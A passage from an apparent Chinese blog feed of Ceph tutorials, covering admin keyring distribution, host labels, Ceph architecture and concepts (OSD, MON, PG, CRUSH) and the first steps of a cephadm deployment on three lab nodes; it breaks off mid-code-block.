~]<span class="hljs-comment"># ceph -v</span><br>ceph version <span class="hljs-number">18.2</span><span class="hljs-number">.4</span> (e7ad5345525c7aa95470c26863873b581076945d) reef (stable)<br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 ~]<span class="hljs-comment"># ll /etc/ceph/</span><br>total <span class="hljs-number">12</span><br>drwxr-xr-x   <span class="hljs-number">2</span> root root <span class="hljs-number">4096</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">16</span>:<span class="hljs-number">37</span> ./<br>drwxr-xr-x <span class="hljs-number">101</span> root root <span class="hljs-number">4096</span> Aug <span class="hljs-number">21</span> <span class="hljs-number">16</span>:<span class="hljs-number">37</span> ../<br>-rw-r--r--   <span class="hljs-number">1</span> root root   <span class="hljs-number">92</span> Jul <span class="hljs-number">12</span> <span class="hljs-number">23</span>:<span class="hljs-number">42</span> rbdmap<br>[root@ceph142 ~]<span class="hljs-comment"># </span><br>[root@ceph142 ~]<span class="hljs-comment"># ceph -s  # 很明显，此节点的ceph管理ceph集群</span><br><span class="hljs-built_in">Error</span> initializing cluster client: ObjectNotFound(<span class="hljs-string">&#x27;RADOS object not found (error calling conf_read_file)&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>ceph141节点拷贝认证文件到ceph142节点</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@ceph141</span> <span class="hljs-operator">~</span>]# scp <span class="hljs-regexp">/etc/</span>ceph<span class="hljs-regexp">/ceph.&#123;conf,client.admin.keyring&#125; ceph142:/</span>etc<span class="hljs-regexp">/ceph/</span><br></code></pre></td></tr></table></figure><p><strong>ceph142节点测试</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@ceph142 ~]<span class="hljs-comment"># ll /etc/ceph/</span><br>total 20<br>drwxr-xr-x  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 21 </span>16:40 ./<br>drwxr-xr-x<span class="hljs-number"> 101 </span>root root<span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 21 </span>16:37 ../<br>-rw-------  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 151 </span>Aug<span class="hljs-number"> 21 </span>16:40 ceph.client.admin.keyring<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 259 </span>Aug<span class="hljs-number"> 21 </span>16:40 ceph.conf<br>-rw-r--r--  <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 92 </span>Jul<span class="hljs-number"> 12 </span>23:42 rbdmap<br><br>[root@ceph142 ~]<span class="hljs-comment"># ceph -s</span><br>  cluster:<br>    id:     c153209c-d8a0-11ef-a0ed-bdb84668ed01<br>    health: HEALTH_OK<br> <br>  services:<br>    mon:<span class="hljs-number"> 3 </span>daemons, quorum ceph141,ceph142,ceph143 (age 21m)<br>    mgr: ceph141.iphxbv(active, since 21m), standbys: ceph142.mxilbz<br>    osd:<span class="hljs-number"> 6 </span>osds:<span class="hljs-number"> 6 </span>up (since 21m),<span class="hljs-number"> 6 </span>in (since 2h)<br> <br>  data:<br>    pools:  <span class="hljs-number"> 1 </span>pools,<span class="hljs-number"> 1 </span>pgs<br>    objects:<span class="hljs-number"> 2 </span>objects,<span class="hljs-number"> 449 </span>KiB<br>    usage:  <span class="hljs-number"> 575 </span>MiB used,<span class="hljs-number"> 899 </span>GiB /<span class="hljs-number"> 900 </span>GiB avail<br>    pgs:    <span class="hljs-number"> 1 </span>active+clean<br></code></pre></td></tr></table></figure><h2 id="五、标签管理"><a href="#五、标签管理" class="headerlink" title="五、标签管理"></a>五、标签管理</h2><p>一般情况下，管理节点，我们都会为节点打上对应的标签，以便于日后工作交接</p><p><strong>添加标签</strong></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@ceph141</span> ~]# ceph orch host <span class="hljs-type">label</span> <span class="hljs-keyword">add</span> ceph<span class="hljs-number">142</span> _admin<br>Added <span class="hljs-type">label</span> _admin <span class="hljs-keyword">to</span> host ceph<span class="hljs-number">142</span><br>[root<span class="hljs-title">@ceph141</span> ~]# ceph orch host <span class="hljs-type">label</span> <span class="hljs-keyword">add</span> ceph<span class="hljs-number">143</span> _admin<br>Added <span class="hljs-type">label</span> _admin <span class="hljs-keyword">to</span> host ceph<span class="hljs-number">143</span><br>[root<span class="hljs-title">@ceph141</span> ~]# ceph orch host <span class="hljs-type">label</span> <span class="hljs-keyword">add</span> ceph<span class="hljs-number">143</span> cherry<br>Added <span class="hljs-type">label</span> cherry <span class="hljs-keyword">to</span> host ceph<span class="hljs-number">143</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f310cf021830485da4cfcc35be26b243.png" alt="img"></p><p><strong>移除标签</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@ceph141 ~]<span class="hljs-comment"># ceph orch host label rm ceph143 cherry </span><br>Removed label oldboyedu <span class="hljs-keyword">from</span> host ceph143<br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch host label rm ceph143 _admin</span><br>Host ceph143 does <span class="hljs-keyword">not</span> have label <span class="hljs-string">&#x27;admin&#x27;</span>. Please use <span class="hljs-string">&#x27;ceph orch host ls&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">list</span> all the labels.<br>[root@ceph141 ~]<span class="hljs-comment"># ceph orch host label rm ceph143 _admin</span><br>Removed label _admin <span class="hljs-keyword">from</span> host ceph143<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d8b564855fed4e15ac0e0b28691971d6.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>存储篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ceph</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ceph基本概念，架构，部署（一）</title>
    <link href="/2025/04/18/ceph%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%EF%BC%8C%E6%9E%B6%E6%9E%84%EF%BC%8C%E9%83%A8%E7%BD%B2%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2025/04/18/ceph%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%EF%BC%8C%E6%9E%B6%E6%9E%84%EF%BC%8C%E9%83%A8%E7%BD%B2%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="一、分布式存储概述"><a href="#一、分布式存储概述" class="headerlink" title="一、分布式存储概述"></a>一、分布式存储概述</h2><h3 id="1-存储分类"><a href="#1-存储分类" class="headerlink" title="1.存储分类"></a>1.存储分类</h3><p>存储分为<strong>封闭系统的存储</strong>和<strong>开放系统的存储</strong>，而对于开放系统的存储又被分为<strong>内置存储</strong>和<strong>外挂存储</strong>。</p><p>外挂存储又被细分为直连式存储(DAS)和网络存储(FAS)，而网络存储又被细分网络接入存储(NAS)和存储区域网络(SAN)等。</p><ul><li><p>DAS(Direct-attached Storage): 直连存储,即直接连接到主板的总线上去的，我们可以对这些设备进行格式化操作。 典型代表有：IDE，SATA，SCSI，SAS，USB等。</p></li><li><p>SAN(Storage Area Network): 存储区域网络，是一个网络上的磁盘。它提供的一个块设备而非文件系统。 早期是通过SCSI协议传输数据，后来设计通过光纤通道交换机连接存储阵列和服务器主机，也称为FC SAN，当然也可以基于以太网传输，我们称之为ISCSI协议。</p></li><li><p>NAS(Network Attached Storage): 网络附加存储，是一个网络上的文件系统，我们无法进行格式化操作。典型代表有：NFS，CIFS等。</p></li></ul><p>专门的存储厂商可以通过RAID技术来实现数据的高效存储，国内外很多企业都有自己的存储设备，例如EMC,NetApp,IBM,惠普，Dell，爱数等。</p><p>但是这些专业的存储设备不仅价格是非常昂贵的，而且是非常重的，大多数都是基于FC SAN，ISCSI或者NAS访问接口，所以在某种意义上将他们的存储能力和扩展能力是非常有限的，这个时候我们就需要一个能够实现横向存储的分布式存储。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/7223093e4dcf42e2bccc4fb68f1b20bc.png" alt="img"></p><h3 id="2-存储系统的分类"><a href="#2-存储系统的分类" class="headerlink" title="2.存储系统的分类"></a>2.存储系统的分类</h3><ul><li><p>块存储系统: 通常对应的是一个裸设备，比如一块磁盘，我们需要格式化后进行挂载方能使用。 代表产品: lvm，cinder。</p></li><li><p>文件系统存储系统: 文件系统只是数据组织存放的接口。文件系统通常是构建在一个块存储级别之上。 文件系统被分为元数据区域和数据区域，对于用户而言，它呈现为一个树形结构(实际上提供的是一个目录)。 代表产品: NFS，glusterfs。</p></li><li><p>对象存储系统: 对象存储并没有向文件系统那样划分为元数据区域和数据区域，而是按照不同的对象进行存储，而且每个对象内部维护着元数据和数据区域。因此每个对象都有自己独立的管理格式。 代表产品: Fastdfs，swift。</p></li></ul><p><strong>补充知识：</strong></p><p>为什么网速很慢，上传10T这种大文件确很快？</p><p>因为每一个文件都有独有的hash值，就是我们上传文件时，系统去扫描文件的<a href="https://zhida.zhihu.com/search?content_id=451076183&content_type=Answer&match_order=1&q=%E5%93%88%E5%B8%8C%E7%A0%81&zhida_source=entity">哈希码</a>并保存在数据库中，每个文件（包括其副本）的哈希码都是独一无二的，就是说，如果哈希码相同，我们可以定义为是同一个文件。接下来就简单了，上传时判断哈希码，如果数据库里有相同的哈希码就说明这个文件在云端有一摸一样的副本了，直接显示上传完成就可以了，文件并没有被真实上传，你的等待时间是计算哈希码的时间。如果在云端没有相同哈希码的文件，系统再老老实实上传。</p><p>而修改文件名并不会改变hash值，不要不更改文件内容，哈希码就不会改变。所以可以实现秒传的技术。</p><p>文件哈希码的特性使哈希码用途很广泛，因为用哈希码可以标定所有相同的文件。除了秒传、去重等功能，还可以用在判断文件是否更新、统一阻止违规文件传播、统一删除文件上上传文件等</p><p>如果多个用户拥有相同资源，实际上远程存储服务器也只是存储一份，如果我们本地删除改文件，其实也是删除软连接，远端存储服务器的数据并不会删除。所有也并不会影响其他用户访问。所有大家在网盘上传隐私性较强的东西一定要谨慎~</p><h2 id="二、Ceph分布式存储系统概述"><a href="#二、Ceph分布式存储系统概述" class="headerlink" title="二、Ceph分布式存储系统概述"></a>二、Ceph分布式存储系统概述</h2><p>Ceph 是一个开源的分布式存储系统，旨在提供高性能、高可扩展性和高可靠性的存储解决方案。它能够通过统一的存储平台同时支持块存储、对象存储和文件存储。Ceph 是一个去中心化的系统，能够在大规模分布式环境中工作，广泛应用于云计算和大数据处理领域。</p><p><strong>特点</strong></p><ul><li>高可扩展性：Ceph 能够动态扩展，随着更多的存储节点的加入，集群的容量和性能也能够得到相应的扩展。</li><li>高可靠性：Ceph 使用 CRUSH 算法来实现数据的分布式存储和副本管理，从而确保数据的高可靠性。当某个节点发生故障时，Ceph 可以自动恢复丢失的数据。</li><li>自我修复：Ceph 会自动检测节点故障并进行数据恢复，确保数据的高可用性。</li><li>灵活性：Ceph 可以同时提供块存储、对象存储和文件存储服务，适应多种存储需求。</li><li>性能优化：Ceph 使用对象存储和 CRUSH 算法来优化存储性能，支持高吞吐量和低延迟的存储需求。</li></ul><h3 id="1-Ceph-组件"><a href="#1-Ceph-组件" class="headerlink" title="1.Ceph 组件"></a>1.Ceph 组件</h3><p><strong>Ceph OSD (Object Storage Daemon)</strong></p><ul><li><strong>作用</strong>：负责存储数据和处理数据的复制、恢复、重平衡等操作。每个 OSD 进程通常对应一个物理硬盘或磁盘阵列。</li><li><strong>功能</strong>：数据存储、数据复制、数据重建和故障转移等。OSD 是 Ceph 集群的工作核心。</li></ul><p><strong>Ceph MON (Monitor)</strong></p><ul><li><strong>作用</strong>：监控 Ceph 集群的健康状况，维护集群的元数据，并确保集群的一致性。MON 节点管理集群状态信息、存储池、OSD 设备等元数据。</li><li><strong>功能</strong>：提供集群的状态信息，处理客户端和 OSD 之间的交互，确保集群的一致性和健康状态。</li></ul><p><strong>Ceph MDS (Metadata Server)</strong></p><ul><li><strong>作用</strong>：仅在 Ceph 用作文件系统（CephFS）时使用，负责处理文件系统的元数据管理，如文件目录结构、文件权限、文件名等。</li><li><strong>功能</strong>：在 CephFS 中管理目录、文件元数据和锁，并提供文件访问接口。</li></ul><p><strong>Ceph Client</strong></p><ul><li><strong>作用</strong>：客户端是与 Ceph 集群交互的应用程序或系统，进行数据存储、访问、管理等操作。</li><li><strong>功能</strong>：客户端可以是使用 Ceph 提供的不同接口进行操作的应用，例如 Ceph RBD（块存储）、CephFS（文件存储）等。</li></ul><p><strong>Ceph RGW (Rados Gateway)</strong></p><ul><li><strong>作用</strong>：Rados Gateway 提供与 Ceph 集群的对象存储服务的接口，支持通过 HTTP 协议访问存储的数据，兼容 S3 和 OpenStack Swift API。</li><li><strong>功能</strong>：允许对象存储服务的访问和管理，提供 RESTful 接口，适用于云存储服务和大数据应用等。</li></ul><p><strong>CRUSH (Controlled Replication Under Scalable Hashing)</strong></p><ul><li><strong>作用</strong>：CRUSH 是 Ceph 的数据分布和复制算法，用于决定数据如何在 OSD 之间分配和存储，避免中央元数据服务的瓶颈。</li><li><strong>功能</strong>：实现数据的分布式存储和复制策略，确保数据冗余和高可用性。</li></ul><p><strong>Ceph Pools</strong></p><ul><li><strong>作用</strong>：池是 Ceph 中用于存储数据的逻辑分区，每个池有不同的设置和配置，如副本数量、对象大小等。</li><li><strong>功能</strong>：用于数据存储和隔离，支持不同的存储策略（例如，块存储、对象存储等）。</li></ul><p><strong>Ceph Dashboard (可选)</strong></p><ul><li><strong>作用</strong>：提供 Ceph 集群的 Web 界面，供管理员查看集群的状态、健康状况、性能指标、配置等。</li><li><strong>功能</strong>：集群监控和管理界面，支持查看集群健康、性能、日志等信息。</li></ul><p><strong>Ceph RBD (Rados Block Device)</strong></p><ul><li><strong>作用</strong>：Ceph 提供的块存储服务，允许客户端将 Ceph 集群作为块设备挂载到操作系统中，适用于虚拟化存储或数据库等应用场景。</li><li><strong>功能</strong>：提供与传统块设备（如 iSCSI）类似的功能，但具有 Ceph 集群的可扩展性和容错性。</li></ul><p><strong>CephFS (Ceph File System)</strong></p><ul><li><strong>作用</strong>：Ceph 的文件系统接口，允许将 Ceph 集群作为一个分布式文件系统进行访问。</li><li><strong>功能</strong>：提供 POSIX 兼容的文件系统，支持多客户端并发访问，适用于高性能计算、大数据处理等应用场景。</li></ul><p><strong>总结：</strong></p><ul><li><strong>OSD</strong>：处理数据存储和复制。</li><li><strong>MON</strong>：监控集群状态和元数据管理。</li><li><strong>MDS</strong>：管理 CephFS 文件系统的元数据。</li><li><strong>RGW</strong>：提供对象存储接口。</li><li><strong>CRUSH</strong>：数据分布和复制算法。</li><li><strong>Pools</strong>：逻辑存储池，用于数据组织。</li><li><strong>Client</strong>：与集群交互的客户端应用程序。</li><li><strong>RBD</strong>：块存储服务。</li><li><strong>CephFS</strong>：分布式文件系统。</li><li><strong>Dashboard</strong>：集群管理和监控界面。</li></ul><h3 id="2-Ceph逻辑单元"><a href="#2-Ceph逻辑单元" class="headerlink" title="2.Ceph逻辑单元"></a>2.Ceph逻辑单元</h3><ul><li>pool（池）：pool是Ceph存储数据时的逻辑分区，它起到namespace的作用，在集群层面的逻辑切割。每个pool包含一定数量(可配置)的PG。</li><li>PG（Placement Group）：PG是一个逻辑概念，每个对象都会固定映射进一个PG中，所以当我们要寻找一个对象时，只需要先找到对象所属的PG，然后遍历这个PG就可以了，无需遍历所有对象。而且在数据迁移时，也是以PG作为基本单位进行迁移。PG的副本数量也可以看作数据在整个集群的副本数量。一个PG 包含多个 OSD 。引入 PG 这一层其实是为了更好的分配数据和定位数据。</li><li>OID：存储的数据都会被切分成对象（Objects）。每个对象都会有一个唯一的OID，由ino与ono生成，ino即是文件的File ID，用于在全局唯一标示每一个文件，而ono则是分片的编号，OID &#x3D; ( ino + ono )&#x3D; (File ID + File part number)，例如File Id &#x3D; A，有两个分片，那么会产生两个OID，A01与A02。</li><li>PgID：首先使用静态hash函数对OID做hash取出特征码，用特征码与PG的数量去模，得到的序号则是PGID。</li><li>Object：Ceph最底层的存储单元是 Object对象，每个 Object 包含元数据和原始数据</li></ul><h3 id="3-pool、PG、OSD-关系"><a href="#3-pool、PG、OSD-关系" class="headerlink" title="3.pool、PG、OSD 关系"></a>3.pool、PG、OSD 关系</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/78357d84266d4f84beda5f35114fee04.png" alt="img"></p><ul><li>一个Pool里有很多PG，</li><li>一个PG里包含一堆对象；一个对象只能属于一个PG；</li><li>PG有主从之分，一个PG分布在不同的OSD上（针对三副本类型）</li></ul><h2 id="三、Ceph-设计"><a href="#三、Ceph-设计" class="headerlink" title="三、Ceph 设计"></a>三、Ceph 设计</h2><h3 id="1-整体设计"><a href="#1-整体设计" class="headerlink" title="1.整体设计"></a>1.整体设计</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/8ebc5de0fb864a0faaf77fc9ce1ed241.png" alt="img"></p><p><strong>基础存储系统 RADOS</strong></p><p>Reliable, Autonomic,Distributed Object Store，即可靠的、自动化的、分布式的对象存储</p><p>这就是一个完整的对象存储系统，所有存储在 Ceph 系统中的用户数据事实上最终都是由这一层来存储的。而 Ceph 的高可靠、高可扩展、高性能、高自动化等等特性本质上也是由这一层所提供的</p><p><strong>基础库 librados</strong></p><p>这层的功能是对 RADOS 进行抽象和封装，并向上层提供 API，以便直接基于 RADOS（而不是整个 Ceph）进行应用开发。特别要注意的是，RADOS 是一个对象存储系统，因此，librados 实现的 API 也只是针对对象存储功能的。RADOS 采用 C++ 开发，所提供的原生 librados API 包括 C 和 C++ 两种。</p><p><strong>高层应用接口</strong></p><p>这层包括了三个部分：RADOS GW（RADOS Gateway）、 RBD（Reliable Block Device）和 Ceph FS（Ceph File System），其作用是在 librados 库的基础上提供抽象层次更高、更便于应用或客户端使用的上层接口。其中，RADOS GW 是一个提供与 Amazon S3 和 Swift 兼容的 RESTful API 的 gateway，以供相应的对象存储应用开发使用。RADOS GW 提供的 API 抽象层次更高，但功能则不如 librados 强大。</p><p><strong>应用层</strong></p><p>这层是不同场景下对于 Ceph 各个应用接口的各种应用方式，例如基于 librados 直接开发的对象存储应用，基于 RADOS GW 开发的对象存储应用，基于 RBD 实现的云硬盘等等。librados 和 RADOS GW 的区别在于，librados 提供的是本地 API，而 RADOS GW 提供的则是 RESTfulAPI。</p><p>由于 Swift 和 S3 支持的 API 功能近似，这里以 Swift 举例说明。Swift 提供的 API 功能主要包括：</p><ul><li>用户管理操作：用户认证、获取账户信息、列出容器列表等；</li><li>容器管理操作：创建 &#x2F; 删除容器、读取容器信息、列出容器内对象列表等；</li><li>对象管理操作：对象的写入、读取、复制、更新、删除、访问许可设置、元数据读取或更新等</li></ul><h3 id="2-逻辑架构"><a href="#2-逻辑架构" class="headerlink" title="2.逻辑架构"></a>2.逻辑架构</h3><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d8bc4b3fa3d64fe4bae0d2f10d8fd793.png" alt="img"></p><h3 id="3-Ceph物理组件架构"><a href="#3-Ceph物理组件架构" class="headerlink" title="3.Ceph物理组件架构"></a>3.Ceph物理组件架构</h3><p>RADOS是Ceph的核心，我们谈及的物理组件架构也只是RADOS的物理架构。</p><p>RADOS集群是由若干服务器组成，每一个服务器上都相应会运行RADOS的核心守护进程（OSD、MON、MDS）。具体守护进程的数量需要根据集群的规模和既定的规则来配置。</p><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/a9a132418ceb480bb08be115eb61e6b3.png" alt="img"></p><p>我们首先来看每一个集群节点上面的守护进程的主要作用：</p><p><strong>OSD Daemon</strong>：两方面主要作用，一方面负责数据的处理操作，另外一方面负责监控本身以及其他OSD进程的健康状态并汇报给MON。OSD守护进程在每一个PG（Placement Group）当中，会有主次（Primary、Replication）之分，Primary主要负责数据的读写交互，Replication主要负责数据副本的复制。其故障处理机制主要靠集群的Crush算法来维持Primary和Replication之间的转化和工作接替。所有提供磁盘的节点上都要安装OSD 守护进程。</p><p><strong>MON Daemon</strong>：三方面主要作用，首先是监控集群的全局状态（OSD Daemon Map、MON Map、PG Map、Crush Map），这里面包括了OSD和MON组成的集群配置信息，也包括了数据的映射关系。其次是管理集群内部状态，当OSD守护进程故障之后的系列恢复工作，包括数据的复制恢复。最后是与客户端的查询及授权工作，返回客户端查询的元数据信息以及授权信息。安装节点数目为2N+1，至少三个来保障集群算法的正常运行。</p><p><strong>MDS Daemon</strong>：它是Ceph FS的元数据管理进程，主要是负责文件系统的元数据管理，它不需要运行在太多的服务器节点上。安装节点模式保持主备保护即可</p><h3 id="4-Ceph数据对象组成"><a href="#4-Ceph数据对象组成" class="headerlink" title="4.Ceph数据对象组成"></a>4.Ceph数据对象组成</h3><p>从客户端发出的一个文件请求，到Rados存储系统写入的过程当中会涉及到哪些逻辑对象，他们的关系又是如何的？首先，我们先来列出这些对象：</p><p>（1）文件（FILE）：用户需要存储或者访问的文件。对于一个基于Ceph开发的对象存储应用而言，这个文件也就对应于应用中的“对象”，也就是用户直接操作的“对象”。</p><p>（2）对象（Object）：RADOS所看到的“对象”。Object指的是最大size由RADOS限定（通常为2&#x2F;4MB）之后RADOS直接进行管理的对象。因此，当上层应用向RADOS存入很大的file时，需要将file切分进行存储。</p><p>（3）PG（Placement Group）：PG是一个逻辑概念，阐述的是Object和OSD之间的地址映射关系，该集合里的所有对象都具有相同的映射策略；Object &amp; PG，N：1的映射关系；PG &amp; OSD，1：M的映射关系。一个Object只能映射到一个PG上，一个PG会被映射到多个OSD上。</p><p>（4）OSD（Object Storage Device）：存储对象的逻辑分区，它规定了数据冗余的类型和对应的副本分布策略；支持两种类型：副本和纠删码。</p><p>接下来，我们以更直观的方式来展现在Ceph当中数据是如何组织起来的：</p><p> <img src="https://gitee.com/ljh00928/csdn/raw/master/img/038eb48ccda14b42850eecf189954af4.png" alt="img"></p><p>（1） File &gt; Object</p><p>本次映射为首次映射，即将用户要操作的File，映射为RADOS能够处理的Object。</p><p>具体映射操作本质上就是按照Object的最大Size对File进行切分，每一个切分后产生的Object将获得唯一的对象标识Oid。Oid的唯一性必须得到保证，否则后续映射就会出现问题。</p><p>（2） Object &gt; PG</p><p>完成从File到Object的映射之后， 就需要将每个 Object 独立地映射到 唯一的 PG 当中 去。</p><p>Hash（Oid）&amp; Mask &gt; PGid</p><p>根据以上算法， 首先是使用Ceph系统指定的一个静态哈希函数计算 Oid 的哈希值，将 Oid 映射成为一个近似均匀分布的伪随机值。然后，将这个伪随机值和 Mask 按位相与，得到最终的PG序号（ PG id）。根据RADOS的设计，给定PG的总数为 X（X&#x3D; 2的整数幂）， Mask&#x3D;X-1 。因此，哈希值计算和按位与操作的整体结果事实上是从所有 X 个PG中近似均匀地随机选择一个。基于这一机制，当有大量object和大量PG时，RADOS能够保证object和PG之间的近似均匀映射。</p><p>（3） PG &gt; OSD</p><p>最后的 映射就是将PG映射到数据存储单元OSD。RADOS采用一个名为CRUSH的算法，将 PGid 代入其中，然后得到一组共 N 个OSD。这 N 个OSD即共同负责存储和维护一个PG中的所有 Object 。和“object -&gt; PG”映射中采用的哈希算法不同，这个CRUSH算法的结果不是绝对不变的，而是受到其他因素的影响。</p><p>① 集群状态（Cluster Map）：系统中的OSD状态 。数量发生变化时， CLuster Map 可能发生变化，而这种变化将会影响到PG与OSD之间的映射。</p><p>② 存储策略配置。系统管理员可以指定承载同一个PG的3个OSD分别位于数据中心的不同服务器乃至机架上，从而进一步改善存储的可靠性。</p><p>到这里，可能大家又会有一个问题“为什么这里要用CRUSH算法，而不是HASH算法？”</p><p>这一次映射，我们对映射算法有两种要求：</p><p>一方面，算法必须能够随着系统的节点数量位置的变化，而具备动态调整特性，保障在变化的环境当中仍然可以保持数据分布的均匀性；另外一方面还要有相对的稳定性，也就是说大部分的映射关系不会因为集群的动态变化发生变化，保持一定的稳定性。</p><p>而CRUSH算法正是符合了以上的两点要求，所以最终成为Ceph的核心算法。</p><h2 id="四、ceph-数据存储过程"><a href="#四、ceph-数据存储过程" class="headerlink" title="四、ceph 数据存储过程"></a>四、ceph 数据存储过程</h2><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/aae334b455d4499f9f9ae16bc55f9079.png" alt="img"></p><p>如果我们想要将数据存储到ceph集群，那么大致步骤如下所示:</p><ul><li>Rados Cluster集群固定大小的object可能不符合我们要存储某个大文件，因此一个大文件想要存储到ceph集群，它可能会被拆分成多个data object对象进行存储;</li><li>通常情况下data object请求向某个pool存储数据时，通过CRUSH算法会先对data object进行一致性哈希计算，而后将存储任务映射到到该pool中的某个PG上;</li><li>紧接着，CRUSH算法(是用来完成object存储路由的一个算法)会根据pool的冗余副本数量和data object的存储类型找到足量的OSD进行存储，当然对应的PG是有active PG和standby PG角色之分的，通常副本数我们会设置为3;</li></ul><h2 id="五、ceph集群部署"><a href="#五、ceph集群部署" class="headerlink" title="五、ceph集群部署"></a>五、ceph集群部署</h2><h3 id="1-集群环境准备"><a href="#1-集群环境准备" class="headerlink" title="1.集群环境准备"></a>1.集群环境准备</h3><table><thead><tr><th>主机名</th><th>ip</th><th>配置</th></tr></thead><tbody><tr><td>ceph141</td><td>10.0.0.141</td><td>1c2G，300GB ，500GB</td></tr><tr><td>ceph142</td><td>10.0.0.142</td><td>1c2G，300GB ，500GB</td></tr><tr><td>ceph143</td><td>10.0.0.143</td><td>1c2G，300GB ，500GB</td></tr></tbody></table><p> <strong>ceph所有节点基础环境准备</strong></p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs crystal">基于cephadm部署前提条件，官方提的要求Ubuntu <span class="hljs-number">22.04</span> LTS出了容器运行时其他都满足<br>- Python <span class="hljs-number">3</span><br>- Systemd<br>- Podman or Docker <span class="hljs-keyword">for</span> running containers<br>- Time synchronization (such <span class="hljs-keyword">as</span> Chrony or the legacy ntpd)<br>- LVM2 <span class="hljs-keyword">for</span> provisioning storage devices<br><br>参考链接:<br><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/docs.ceph.com/en</span><span class="hljs-regexp">/latest/cephadm</span><span class="hljs-regexp">/install/</span><span class="hljs-comment">#requirements</span><br></code></pre></td></tr></table></figure><p> <strong>设置时区</strong></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">timedatectl</span> <span class="hljs-built_in">set-timezone</span> <span class="hljs-string">Asia</span>/<span class="hljs-string">Shanghai</span><br><span class="hljs-string">ll</span> /<span class="hljs-string">etc</span>/<span class="hljs-string">localtime</span><br></code></pre></td></tr></table></figure><p> <strong>安装docker环境</strong></p><p>关于docker安装脚本可参考我这篇博文：<a href="https://blog.csdn.net/m0_69326428/article/details/144375315">kubeadm 部署k8s-CSDN博客</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">tar xf autoinstall-docker-docker-compose<span class="hljs-selector-class">.tar</span><span class="hljs-selector-class">.gz</span> <br>./install-docker<span class="hljs-selector-class">.sh</span> i<br></code></pre></td></tr></table></figure><p> <strong>添加hosts文件解析</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">cat &gt;&gt; /etc/hosts &lt;&lt;EOF<br><span class="hljs-number">10.0.0.141</span> ceph141<br><span class="hljs-number">10.0.0.142</span> ceph142<br><span class="hljs-number">10.0.0.143</span> ceph143<br>EOF<br></code></pre></td></tr></table></figure><h3 id="2-cephadm部署初始化新集群"><a href="#2-cephadm部署初始化新集群" class="headerlink" title="2.cephadm部署初始化新集群"></a>2.cephadm部署初始化新集群</h3><p><strong>下载需要安装ceph版本的cephadm</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@ceph141</span> ~]<span class="hljs-meta"># CEPH_RELEASE=18.2.4</span><br>[root<span class="hljs-symbol">@ceph141</span> ~]<span class="hljs-meta"># curl --silent --remote-name --location https://download.ceph.com/rpm-$&#123;CEPH_RELEASE&#125;/el9/noarch/cephadm</span><br></code></pre></td></tr></table></figure><p> <strong>将cephadm添加到PATH环境变量</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 